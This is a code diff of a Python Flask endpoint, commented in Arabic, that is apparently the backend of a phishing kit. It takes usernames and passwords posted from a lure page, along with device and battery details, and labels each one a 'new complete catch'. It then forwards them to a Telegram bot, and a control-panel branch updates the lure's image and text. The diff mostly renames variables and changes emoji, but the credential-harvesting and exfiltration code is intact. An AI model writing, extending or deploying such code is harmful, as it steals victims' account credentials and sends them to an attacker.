@@ -18,21 +18,21 @@ def save_data():
     try:
         data = request.json
         
-        # إذا كانت البيانات قادمة من لوحة التحكم
+        # إذا كان الطلب لتحديث الإعدادات
         if 'image' in data and 'letter' in data:
             latest_config = data
             return jsonify({"status": "success"}), 200
         
-        # استخراج البيانات المرسلة من الصفحة
+        # استلام البيانات المفصلة من HTML
         user = data.get('user', 'غير معروف')
         pw = data.get('pass', 'غير معروف')
         device = data.get('device', 'غير معروف')
-        battery = data.get('battery', 'غير معروف')
-        time_sent = data.get('time', 'غير محدد')
+        battery = data.get('battery', 'N/A')
+        time_str = data.get('time', 'غير محدد')
 
-        # صياغة الرسالة بتنسيق مرتب جداً ومريح للعين
+        # بناء الرسالة بشكل مرتب ومنظم جداً
         full_message = (
-            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
+            "🔥 **إشعار: صيد جديد مـكتمل** 🔥\n"
             "━━━━━━━━━━━━━━━\n"
             "👤 **بيانات الحساب:**\n"
             f"📧 المستخدم: `{user}`\n"
@@ -42,14 +42,14 @@ def save_data():
             f"🖥️ النظام: {device}\n"
             f"🔋 البطارية: {battery}\n"
             "━━━━━━━━━━━━━━━\n"
-            f"⏰ الوقت: {time_sent}\n"
+            f"⏰ الوقت: {time_str}\n"
             "━━━━━━━━━━━━━━━"
         )
 
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         requests.post(url, json={
-            "chat_id": CHAT_ID, 
-            "text": full_message, 
+            "chat_id": CHAT_ID,
+            "text": full_message,
             "parse_mode": "Markdown"
         })
 
